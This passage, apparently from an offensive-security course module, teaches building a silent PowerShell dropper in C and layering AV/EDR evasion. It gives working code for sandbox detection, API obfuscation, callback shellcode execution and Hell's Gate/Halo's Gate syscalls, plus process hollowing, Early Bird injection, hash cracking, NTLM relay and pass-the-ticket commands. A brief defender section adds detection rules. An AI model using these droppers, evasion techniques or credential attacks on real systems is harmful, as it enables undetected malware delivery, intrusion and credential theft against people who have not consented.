    si.dwFlags      = STARTF_USESHOWWINDOW; /* honor wShowWindow */
    si.wShowWindow  = SW_HIDE;              /* hide the window */

    /* Step 8: PROCESS_INFORMATION receives handles to the new process/thread
     *
     * We need this to close the handles after CreateProcessA.
     * Not closing handles = handle leak (minor, but sloppy).
     */
    PROCESS_INFORMATION pi = {0};

    /* Step 9: Launch PowerShell
     *
     * CreateProcessA parameters:
     *   lpApplicationName = NULL
     *     Let Windows find "powershell.exe" via PATH.
     *     If non-NULL, it's the exact executable path (ignores cmd_line's first token).
     *
     *   lpCommandLine = cmd_line
     *     The full command line string, including the executable name.
     *     Must be writable (not a string literal) — CreateProcessA may modify it.
     *
     *   lpProcessAttributes = NULL  : default process security
     *   lpThreadAttributes  = NULL  : default thread security
     *   bInheritHandles     = FALSE : child doesn't inherit our handles
     *   dwCreationFlags     = CREATE_NO_WINDOW
     *     Suppresses the console window at the PROCESS level.
     *     STARTF_USESHOWWINDOW + SW_HIDE hides the main WINDOW.
     *     CREATE_NO_WINDOW prevents a CONSOLE from being allocated at all.
     *     Use BOTH for maximum silence.
     *
     *   lpEnvironment = NULL    : inherit our environment
     *   lpCurrentDirectory = NULL : inherit our working directory
     *   lpStartupInfo = &si     : our STARTUPINFOA with hidden window flags
     *   lpProcessInformation = &pi : receives process + thread handles
     */
    CreateProcessA(
        NULL,                       /* lpApplicationName: search PATH for powershell.exe */
        cmd_line,                   /* lpCommandLine: full command */
        NULL,                       /* lpProcessAttributes */
        NULL,                       /* lpThreadAttributes */
        FALSE,                      /* bInheritHandles */
        CREATE_NO_WINDOW,           /* dwCreationFlags: no console window */
        NULL,                       /* lpEnvironment: inherit */
        NULL,                       /* lpCurrentDirectory: inherit */
        &si,                        /* lpStartupInfo */
        &pi                         /* lpProcessInformation */
    );

    /* Step 10: Close handles — we don't need them
     *
     * CloseHandle() releases our reference to the process and thread handles.
     * The PowerShell process CONTINUES running — it has its own reference to itself.
     * We're just releasing OUR handle to it.
     * Not calling CloseHandle is a handle leak — always clean up.
     */
    CloseHandle(pi.hThread);    /* release thread handle */
    CloseHandle(pi.hProcess);   /* release process handle */

    /* Step 11: Exit immediately
     *
     * WinMain returns 0 = success.
     * dropper.exe exits. PowerShell continues running in the background.
     * From the user's perspective: nothing happened.
     */
    return 0;
}
```

### Compile and Test

```powershell
# MSVC — from Developer Command Prompt
cl.exe ghost_dropper.c /Fe:dropper.exe /link user32.lib

# MinGW — -mwindows sets subsystem to WINDOWS (no console)
gcc ghost_dropper.c -o dropper.exe -mwindows

# Verify no console window in the PE headers
# MSVC: link /dump /headers dropper.exe | findstr Subsystem
# Should show: Subsystem             0000000A  (WINDOWS) not 0000000003 (CONSOLE)

# Test — put dropper.exe and ghost.ps1 in the same folder
# Run dropper.exe
# Check %TEMP% for ghost.ps1
Get-Item "$env:TEMP\ghost.ps1"
# Expected: File exists, same content as original ghost.ps1
```

### EXPECTED OUTPUT

```
# MSVC compile:
Microsoft (R) C/C++ Optimizing Compiler Version 19.xx for x64
aes_loader.c
Microsoft (R) Incremental Linker Version 14.xx
/out:dropper.exe

# After running dropper.exe:
PS> Get-Item "$env:TEMP\ghost.ps1"

    Directory: C:\Users\george\AppData\Local\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------  ----
-a----         6/27/2026   9:43 AM           1284 ghost.ps1
```

**Failure: `cl.exe: error C2001: newline in constant` — means the string literal in cmd_line has a real newline. Don't split the snprintf format string across lines.**

**Failure: `Process exits immediately but PowerShell never runs` — check that ghost.ps1 exists in the SAME FOLDER as dropper.exe. GetModuleFileNameA finds the exe location, but if you run from a different directory, the relative path calculation fails. Always deploy dropper.exe and ghost.ps1 together.**

**Failure: `PowerShell window flashes briefly` — you compiled with `main()` not `WinMain()`, or forgot `-mwindows` (MinGW) / the `/subsystem:windows` linker flag. Fix: use WinMain entry point and CREATE_NO_WINDOW flag together.**

// DRILL: Compile ghost_dropper.c. Deploy it with ghost_test.ps1 (the harmless test payload). Run dropper.exe. Confirm the ghost_proof_*.txt file appears in %TEMP% proving the payload executed silently. Verify no console window appeared.

---

## AV/EDR Evasion Taxonomy

Modern endpoint security operates in multiple layers. Understanding
each layer tells you what technique evades which detection mechanism.

### Signature Evasion — Change What You Look Like

Signature-based detection matches known byte patterns. Change the
bytes and the signature doesn't match.

**String mutation**: AV signatures often match on specific strings in
the binary — function names, hardcoded URLs, known shellcode patterns.

```c
// Before: Defender signatures match "VirtualAlloc" string import
// The string "VirtualAlloc" appears literally in the binary's import table
void* exec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// After: Dynamic API resolution — no "VirtualAlloc" string in binary
// Define a function pointer type matching VirtualAlloc's signature
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// XOR-encrypted function name — the string "VirtualAlloc" never appears in plaintext
unsigned char enc_name[] = { 0x36, 0x49, 0x52, 0x54, 0x55, 0x41, 0x4c, ... };
char func_name[32];
xor_decrypt(enc_name, sizeof(enc_name), func_name, xor_key);  // decrypt to "VirtualAlloc" at runtime

// Get the function address dynamically — no import table entry
pVirtualAlloc myAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), func_name);  // resolve at runtime
void* exec = myAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

**Packing/Compression**: Pack the entire binary with UPX or a custom
packer. The unpacking stub is small and benign-looking. The actual
payload is compressed/encrypted in the packed section.

```bash
# UPX packing — basic, but most AV now unpacks UPX automatically
upx --best payload.exe -o packed.exe

# Custom packers are more effective because AV doesn't have a generic
# unpacker for them. Writing a custom packer is a solid exercise.
```

### Expected Output

```
Ultimate Packer for eXecutables ... packed -> packed.exe (ratio: ~0.xx)
```

**Failure looks like `NotPackedException: payload.exe is not packed by UPX` when trying to unpack something not packed — this is fine, you're packing not unpacking.**

**Failure looks like `CantPackException: file is too small` — UPX needs at least a valid PE binary. You can't pack a .py or .txt file.**

---

**Metamorphism**: Generate functionally identical code with different
byte sequences each time. Same behavior, different signature. This is
what advanced malware frameworks do — every build produces a unique binary.

### Behavioral Evasion — Change What You Do (Or When)

Behavioral detection watches what your code DOES at runtime. Allocating
RWX memory, writing shellcode to it, creating remote threads — these
are behavioral indicators.

**Hardware Breakpoints (HWBP)**: You already did this. Setting hardware
breakpoints on ntdll functions to intercept and modify behavior before
EDR hooks see it.

**Sleep timers and delayed execution**: Sandboxes have time limits. If
your payload sleeps for 5 minutes before doing anything malicious, the
sandbox times out and reports "benign." But modern sandboxes fast-forward
sleep calls — so you need smarter delays:

```c
// Naive sleep — sandbox detects and fast-forwards
Sleep(300000);  // 5 minutes — sandbox patches this to return immediately

// Better: time-based check using a CPU-intensive loop
DWORD start = GetTickCount();  // record start time in milliseconds
// Do some busy work (calculate primes, allocate/free memory, etc.)
volatile int x = 0;            // volatile prevents compiler from optimizing loop away
for (int i = 0; i < 100000000; i++) x += i;  // ~1 second of real CPU work
DWORD elapsed = GetTickCount() - start;       // how long did that actually take?

// If elapsed < 1000ms, we're in a sandbox that fast-forwarded our busy loop
// On real hardware this loop takes ~1 second; in a fast-forwarding sandbox it takes ~0ms
if (elapsed < 1000) ExitProcess(0);  // exit clean — looks benign to sandbox

// Even better: use NtDelayExecution and check with QueryPerformanceCounter
// Sandboxes that hook Sleep might not hook the NT-level equivalent
```

**Environment checks**: Detect sandboxes before executing the payload:

```c
// Check for common sandbox indicators — returns TRUE if we're probably in a sandbox
BOOL is_sandbox() {
    // Check RAM (sandboxes often have <4GB to save resources)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return TRUE;  // less than 4GB

    // Check CPU cores (sandboxes often have 1-2 cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;  // single-core = suspicious

    // Check for recent user interaction (sandbox = no mouse movement)
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    if ((GetTickCount() - lii.dwTime) > 600000) return TRUE;  // 10min idle = no human

    // Check disk size (sandbox disks are often <60GB)
    ULARGE_INTEGER disk;
    GetDiskFreeSpaceExA("C:\\", NULL, &disk, NULL);
    if (disk.QuadPart < 60LL * 1024 * 1024 * 1024) return TRUE;  // <60GB total = VM

    return FALSE;  // passed all checks — probably a real system
}
```

### Heuristic Evasion — Don't Look Suspicious

Heuristic engines analyze code patterns without specific signatures.
"This binary allocates RWX memory, writes to it, then calls it as a
function — that's suspicious regardless of what it writes."

**API call patterns**: Instead of the classic
`VirtualAlloc→memcpy→VirtualProtect→CreateThread` chain that every
shellcode loader uses, break the pattern:

```c
// Classic pattern — every EDR flags this sequence
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
DWORD old;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

// Pattern-broken version — same result, different API sequence:
// 1. Use HeapAlloc instead of VirtualAlloc
void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 0x1000);
// 2. Copy in 64-byte chunks with tiny delays — breaks memcpy-then-protect signature
for (int i = 0; i < size; i += 64) {
    memcpy((char*)mem + i, shellcode + i, min(64, size - i));
    SleepEx(1, FALSE);  // 1ms delay between copies — breaks timing heuristics
}
// 3. Execute via callback — no CreateThread call at all
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
// Windows calls YOUR code as a callback. No CreateThread needed.
```

**Callback execution techniques** — ways to execute shellcode without
calling `CreateThread` or `CreateRemoteThread`:

```c
// These all execute a function pointer through legitimate Windows callbacks:
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)shellcode_addr, 0);
EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);
EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
// Timer-based: Windows calls shellcode_addr after 0ms timeout
CreateTimerQueueTimer(&timer, NULL, (WAITORTIMERCALLBACK)shellcode_addr, NULL, 0, 0, 0);
```

### Memory Evasion — Hide What's In RAM

EDR scans process memory looking for known shellcode patterns. Even
after your encrypted payload decrypts and executes, the decrypted
shellcode is in memory and scannable.

**Encrypted sleep**: After the payload executes each task, re-encrypt
itself in memory before sleeping. Decrypt again when the next task
arrives. Reduces the window where scannable shellcode exists in memory.

**Module stomping**: Load a legitimate DLL, then overwrite its `.text`
section with your shellcode. Memory scanners see a loaded DLL at that
address — it looks normal. The content is your code.

**Manual DLL mapping**: Map a DLL into memory manually without using
`LoadLibrary`. This avoids the DLL appearing in the PEB's loaded
module list. EDR tools that enumerate loaded modules won't see it.

---

## Modern Evasion Techniques

### Direct Syscalls — Bypass ntdll.dll Hooks

When your code calls `VirtualAlloc`, the call chain is:
```
Your code -> kernel32.dll!VirtualAlloc -> ntdll.dll!NtAllocateVirtualMemory -> syscall -> kernel
```

EDR products hook ntdll.dll functions — they replace the first
instructions with a `JMP` to their monitoring code. Every call through
ntdll passes through the EDR's hooks first.

**Direct syscalls skip ntdll entirely**:
```
Your code -> syscall instruction (inline assembly) -> kernel
```

No ntdll, no hooks, no EDR visibility.

```nasm
; Direct syscall for NtAllocateVirtualMemory (Windows 10 21H2)
; Syscall number (SSN) = 0x18
mov r10, rcx        ; Windows syscall convention: first arg goes in r10 (not rcx)
mov eax, 0x18       ; syscall number for NtAllocateVirtualMemory — hardcoded here
syscall             ; jump directly to kernel — bypasses ntdll entirely
ret                 ; return to caller
```

**The problem**: Syscall numbers change between Windows versions. The
SSN for `NtAllocateVirtualMemory` might be 0x18 on one build and 0x1A
on another. You need to resolve the correct SSN at runtime.

### Hell's Gate — Dynamic SSN Resolution

Hell's Gate reads the SSN directly from the ntdll.dll image in memory:

```c
// Simplified Hell's Gate concept
// NtAllocateVirtualMemory in ntdll starts with:
//   4c 8b d1     mov r10, rcx
//   b8 XX 00 00 00  mov eax, <SSN>   <- XX is the syscall number we want

DWORD get_ssn(FARPROC func_addr) {
    BYTE* bytes = (BYTE*)func_addr;
    // Check if function is hooked (EDR JMP patch — 0xe9 = JMP opcode)
    if (bytes[0] == 0xe9) {
        return 0;  // hooked — Hell's Gate fails, need Halo's Gate
    }
    // Unhooked: check for expected prologue and extract SSN
    if (bytes[0] == 0x4c && bytes[1] == 0x8b && bytes[2] == 0xd1 &&
        bytes[3] == 0xb8) {
        return *(DWORD*)(bytes + 4);  // SSN is the 4 bytes at offset 4
    }
    return 0;
}
```

### Halo's Gate — When Hell's Gate Fails

```c
// If target function is hooked, check neighbors — SSNs are sequential
DWORD halos_gate(FARPROC func_addr) {
    BYTE* bytes = (BYTE*)func_addr;

    // If not hooked, use Hell's Gate directly
    if (bytes[0] == 0x4c && bytes[3] == 0xb8)
        return *(DWORD*)(bytes + 4);

    for (int offset = 1; offset < 500; offset++) {
        BYTE* up   = bytes - (offset * 32);
        BYTE* down = bytes + (offset * 32);
        if (up[0] == 0x4c && up[3] == 0xb8)
            return *(DWORD*)(up + 4) + offset;
        if (down[0] == 0x4c && down[3] == 0xb8)
            return *(DWORD*)(down + 4) - offset;
    }
    return 0;
}
```

### Indirect Syscalls

```nasm
; Indirect syscall — syscall instruction executes FROM ntdll's address range
mov r10, rcx
mov eax, 0x18                         ; SSN resolved at runtime
jmp qword ptr [syscall_gadget]        ; JMP into ntdll 'syscall; ret' gadget
; Stack return address points back to ntdll — EDR sees nothing unusual
```

### Module Stomping

Instead of allocating new memory (which EDR monitors), overwrite an
existing legitimate DLL's code section:

1. Load a benign DLL with `LoadLibrary` (e.g., `amsi.dll`, `xpsprint.dll`)
2. Find its `.text` section
3. Change permissions to RW
4. Overwrite with your shellcode
5. Change permissions back to RX
6. Execute

### Process Hollowing

```
1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
2. NtUnmapViewOfSection(process, base_address)       // hollow it out
3. VirtualAllocEx(process, base_address, ...)         // allocate space
4. WriteProcessMemory(process, base_address, payload, ...)  // write PE
5. SetThreadContext(thread, ...)                       // redirect entry point
6. ResumeThread(thread)                               // execute
```

### Early Bird Injection

1. Create a suspended process
2. Allocate and write shellcode into its memory
3. Queue an APC to the main thread
4. Resume the thread

The APC fires during process initialization — BEFORE EDR's DLL loads
and places its hooks. Your code runs in a window where no hooks exist.

### Thread Execution Hijack

1. Find a running thread in the target process
2. `SuspendThread(thread)`
3. `GetThreadContext(thread, &ctx)` — save current state
4. `ctx.Rip = shellcode_address` — point RIP to shellcode
5. `SetThreadContext(thread, &ctx)` — apply modified context
6. `ResumeThread(thread)` — thread executes your shellcode

No new thread created. No `CreateRemoteThread` call.

---

## Hash Cracking

Post-exploitation credential access. You've dumped hashes from LSASS,
SAM, NTDS.dit, or captured them with Responder. Now you need plaintext
passwords (or sometimes just the hashes themselves — pass-the-hash).

### Hash Types You'll Encounter

```
# NTLM (from SAM or LSASS dump)
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Hashcat mode: -m 1000

# Net-NTLMv2 (from Responder capture)
admin::CORP:1122334455667788:A1B2C3...:0101000000000000...
# Hashcat mode: -m 5600

# Kerberoast (TGS-REP encrypted with service account password)
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*$a1b2c3...
# Hashcat mode: -m 13100

# AS-REP Roast
$krb5asrep$23$jsmith@CORP.LOCAL:a1b2c3...
# Hashcat mode: -m 18200

# Linux shadow (SHA-512)
$6$rounds=5000$saltsalt$hash...
# Hashcat mode: -m 1800
```

### Hashcat — GPU-Accelerated Cracking

```bash
# Basic dictionary attack
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force with pattern)
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?d?d   # Password12 pattern
hashcat -m 1000 hash.txt -a 3 ?d?d?d?d?d?d?d?d    # 8-digit PIN

# Hybrid: dictionary + mask
hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits

# Kerberoast
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# Show cracked passwords
hashcat -m 1000 hash.txt --show

# Benchmark
hashcat -b
```

### Expected Output

**Successful crack:**
```
31d6cfe0d16ae931b73c59d7e0c089c0:<empty>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
```

**Failure looks like `No hashes loaded` — NTLM should be just the hash, one per line.**

**Failure looks like `No devices found/left` — run `hashcat -I` to see detected devices.**

---

### John the Ripper

```bash
# Basic attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules
john --wordlist=rockyou.txt --rules=jumbo hashes.txt

# Specify format
john --format=nt hashes.txt              # NTLM
john --format=netntlmv2 hashes.txt      # Net-NTLMv2
john --format=krb5tgs hashes.txt        # Kerberoast

# Show cracked
john --show hashes.txt
```

### Expected Output

```
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
password123      (Administrator)
1g 0:00:00:02 DONE
```

---

### When To Crack vs When To Relay

**Crack** when you need plaintext (password reuse, services requiring
plaintext, offline access).

**Relay** when time matters. NTLM relay forwards authentication in
real-time. No cracking needed.

```bash
# NTLM relay with impacket (WSL2 or Linux)
ntlmrelayx.py -t <target_ip> -smb2support
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t <target> -smb2support -c "whoami"
ntlmrelayx.py -t ldaps://<dc_ip> --add-computer
```

### Expected Output

```
[*] SMBD: Received connection from <victim_ip>
[*] Authenticating against smb://<target_ip> as DOMAIN\user SUCCEED
```

---

## Crypto Attacks — Know They Exist

### Padding Oracle Attack (CBC Mode)

```
How it works:
1. Modify the last byte of the second-to-last ciphertext block
2. Send to server
3. Server reports valid or invalid padding
4. Try all 256 values to find the one producing valid padding
5. XOR math reveals the plaintext byte
6. Repeat for every byte in every block
```

```bash
# PadBuster (run inside WSL2)
padbuster <target_url> <encrypted_cookie> <block_size> -cookies "auth=<value>"
```

### Downgrade Attacks

**TLS downgrade**: Force weaker cipher suite. POODLE attacked SSLv3.

**NTLM downgrade**: Force NTLMv1 instead of NTLMv2. NTLMv1 hashes
crackable with rainbow tables.

**Kerberos downgrade**: Request RC4 instead of AES for tickets.
Basis of Kerberoasting.

### Replay Attacks

Capture valid authentication exchange, replay it later.

**Pass-the-Ticket**: Export Kerberos TGT, import on another machine.

```bash
# Export TGT (Mimikatz)
sekurlsa::tickets /export

# Import on attacker machine (Rubeus)
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Hash Length Extension

Server computes `H(secret || message)`. You can extend the message
and compute a valid hash without knowing the secret.

```bash
hash_extender --data "original_data" --secret-min 10 --secret-max 30 \
    --append "admin=true" --signature <original_hash> --format sha256
```

---

## Putting It Together — The Evasion Pipeline

```
Stage 0: Raw shellcode (msfvenom, custom, Cobalt Strike)
   | Caught by: everything
Stage 1: AES-encrypt OR Ghost-encode the shellcode
   | Defeats: static signature matching + entropy analysis (Ghost only)
Stage 2: Build loader with API obfuscation + dynamic resolution
   | Defeats: string-based heuristics
Stage 3: Add environment checks (sandbox detection)
   | Defeats: automated sandbox analysis
Stage 4: Use direct/indirect syscalls for memory operations
   | Defeats: ntdll.dll API hooking (EDR userland hooks)
Stage 5: Execute via callback or thread hijack
   | Defeats: CreateThread-based behavioral detection
Stage 6: Encrypt payload in memory during sleep cycles
   | Defeats: memory scanning
Stage 7: C2 over HTTPS with malleable profile
   | Defeats: network traffic analysis
Stage 8: Deliver via ghost_dropper.exe (no console, no window)
   | Defeats: user observation, casual AV on-access scan

Result: Payload executes on a modern, fully-patched Windows endpoint
with up-to-date EDR.
```

---

## DEFENDER TAKEAWAY

- **Enforce NTLMv2 minimum and disable NTLMv1.** Open Group Policy: `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Network Security: LAN Manager authentication level`. Set to "Send NTLMv2 response only. Refuse LM & NTLM."

- **Enable Windows Defender Credential Guard.** Isolates LSASS in a hardware-protected enclave. Mimikatz can't dump hashes. Policy path: `Computer Configuration -> Administrative Templates -> System -> Device Guard -> Turn on Virtualization Based Security`. Requires UEFI + Secure Boot.

- **Monitor Event ID 4625 (failed logon) and 4648 (logon with explicit credentials) in bulk.** Pass-the-Hash attacks generate Logon Type 3 (network) from unusual source machines.

- **Audit Event ID 4688 (new process creation) with command line logging enabled.** Enable via `Computer Configuration -> Administrative Templates -> System -> Audit Process Creation -> Include command line in process creation events`. Catches `powershell -enc ...` and `powershell -f ghost.ps1`.

- **Hunt for high-entropy PE sections.** Use YARA rules that calculate entropy on `.text` and resource sections. Flag any section with entropy > 7.2. Ghost-encoded payloads bypass this because they're `.ps1` not PE files — add rules for PowerShell scripts containing dense zero-width Unicode.

- **Deploy memory integrity (HVCI — Hypervisor-Protected Code Integrity).** Prevents unsigned kernel drivers. Enable in Windows Security -> Device Security -> Core isolation -> Memory integrity.

- **Hunt for zero-width Unicode in PowerShell scripts.** Regex: `[​-‍⁠-⁤⁪-⁯﻿᠎]{10,}`. A legitimate PS1 file has none of these. A ghost-encoded PS1 has thousands.

- **Rotate service account passwords frequently and audit Kerberoastable accounts.** Run `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`. Use 30+ character random passwords or gMSA.

---

## Summary — Key Takeaways

- **Encoding is not encryption.** Base64 is a format. Defender decodes it trivially.

- **XOR with a short key is broken.** Defender brute-forces 256 keys. AES with a random key per payload is the minimum standard.

- **AES-encrypted shellcode has near-maximum entropy (~7.99 bits/byte).** Modern AV flags high-entropy PE sections without needing a signature. Ghost encoding beats this by collapsing payload entropy to ~3.8 bits/byte.

- **Ghost Encoder embeds payloads in zero-width Unicode characters.** The file appears blank. AV sees Unicode text. Entropy is low. Payload is intact and executable.

- **NTLM hashes are as good as passwords.** Pass-the-hash, pass-the-ticket, and relay attacks mean you often don't need to crack anything.

- **Static evasion is the easy part.** Encrypt the payload and signatures can't match. Behavioral and heuristic evasion — changing HOW your code executes — is the harder problem.

- **Direct syscalls bypass userland hooks.** EDR hooks ntdll.dll. Direct syscalls skip ntdll entirely. Indirect syscalls do the same while hiding the origin. Hell's Gate and Halo's Gate resolve SSNs at runtime.

- **The evasion pipeline is layered.** Stack encryption + Ghost encoding + sandbox detection + syscalls + alternative execution + memory encryption + encrypted C2. Each stage defeats one detection mechanism.

- **Ghost dropper.c uses WinMain + CREATE_NO_WINDOW for silent delivery.** No console, no window, no UAC. User sees nothing. Payload runs.

- **There is no permanent bypass.** The arms race is continuous. Understanding the mechanisms — not just the techniques — is what lets you adapt when the current playbook gets burned.

---

## Key Terms

| Term | Definition |
|------|-----------|
| AES-CBC | Advanced Encryption Standard in Cipher Block Chaining mode. Industry-standard symmetric cipher. Each block XOR'd with previous ciphertext before encryption. |
| RC4 | Stream cipher. Generates a keystream from a key, XORs with plaintext. Simple to implement, zero dependencies, adequate for payload obfuscation. |
| XOR cipher | Bitwise XOR operation with a key. Reversible — same operation encrypts and decrypts. Weak with short keys. |
| IV (Initialization Vector) | Random bytes used to seed the first block in CBC mode. Must be unique per encryption. Transmitted alongside ciphertext, not a secret. |
| PKCS7 padding | Padding scheme that fills the last block to a multiple of the block size. Byte value = number of padding bytes added. |
| Shannon entropy | Measure of randomness in data, 0-8 bits/byte. AES ciphertext scores ~7.99. Ghost-encoded data scores ~3.8. AV flags high entropy. |
| Zero-width Unicode | Unicode formatting characters (U+200B, U+200C, etc.) that render as zero pixels. Used by Ghost Encoder to hide payload in plain sight. |
| Ghost Encoder | Steganographic payload encoder. Converts shellcode bytes to pairs of zero-width Unicode characters. Output appears blank, defeats entropy analysis. |
| GHOST_ALPHABET | The 16 zero-width Unicode characters used as a hex alphabet by Ghost Encoder. Each maps to one hex digit (0-15). |
| Nibble | Half a byte — 4 bits, representing one hex digit (0-F). Ghost Encoder encodes each byte as two nibbles, each mapped to one invisible character. |
| WinMain | Windows GUI application entry point. Using WinMain instead of main() suppresses the console window — essential for silent droppers. |
| CREATE_NO_WINDOW | CreateProcess flag. Prevents a console window from being allocated for the child process. Combine with SW_HIDE for full silence. |
| CNG (Cryptography Next Generation) | Windows built-in cryptography API. BCryptOpenAlgorithmProvider, BCryptDecrypt, etc. No external DLL needed — present on all Windows installs. |
| KSA (Key Scheduling Algorithm) | RC4's initialization phase. Shuffles the 256-byte state array using the key, producing a key-unique permutation. |
| PRGA (Pseudo-Random Generation Algorithm) | RC4's stream generation phase. Outputs keystream bytes by further shuffling the state array. |
| NTLM hash | Windows password hash: MD4(UTF-16LE(password)). No salt. Usable directly for pass-the-hash authentication. |
| Pass-the-Hash | Authenticating to Windows using an NTLM hash directly, without knowing the plaintext password. |
| Pass-the-Ticket | Injecting a stolen Kerberos TGT or TGS into the current session to assume that user's identity. |
| Kerberoasting | Requesting a TGS-REP for a service account SPN, extracting the RC4-encrypted ticket, cracking it offline. |
| Direct syscall | Invoking kernel functions with an inline `syscall` instruction, bypassing ntdll.dll and its EDR hooks. |
| SSN (Syscall Service Number) | The number that identifies a specific kernel function. Changes between Windows builds. |
| Hell's Gate | Technique to read the SSN from ntdll's in-memory function bytes. Fails if the function is hooked. |
| Halo's Gate | Extension of Hell's Gate that infers the SSN from neighboring unhooked functions when the target is hooked. |
| Indirect syscall | Direct syscall variant where the `syscall; ret` gadget is borrowed from ntdll's address range, hiding the true call origin. |
| Process hollowing | Creating a suspended legitimate process, replacing its memory with a payload, resuming execution under the legitimate process name. |
| Module stomping | Overwriting a loaded legitimate DLL's code section with shellcode so memory scanners see a trusted module name at that address. |
| Early Bird injection | APC injection technique that fires before EDR hooks are initialized, during the target process's startup. |
| Thread execution hijack | Redirecting an existing thread's instruction pointer to shellcode without creating a new thread. |
| Padding oracle attack | Attack on CBC encryption where server error behavior leaks padding validity, enabling full decryption without the key. |
| NTLM relay | Forwarding a victim's NTLM authentication in real-time to a different target, gaining access without cracking. |
| Hashcat | GPU-accelerated password hash cracker. Supports dictionary, mask, hybrid, and rule-based attacks. |
| pycryptodome | Python cryptography library. Install with `pip install pycryptodome`. Provides `Crypto.*` namespace. |
| ETW (Event Tracing for Windows) | Windows kernel telemetry subsystem. EDR uses ETW to monitor system calls even when ntdll hooks are bypassed. |
| AMSI (Antimalware Scan Interface) | Windows API that lets AV engines scan script content (PowerShell, VBScript, JScript) before execution. Decodes base64 automatically. |
| SecureZeroMemory | Windows API that zeroes a buffer and cannot be optimized away by the compiler. Use to wipe keys and plaintext shellcode from heap memory after use. |
| BCryptDecrypt | CNG API for AES decryption. Requires bcrypt.lib at link time. Takes a key handle, IV, ciphertext, and output buffer. |
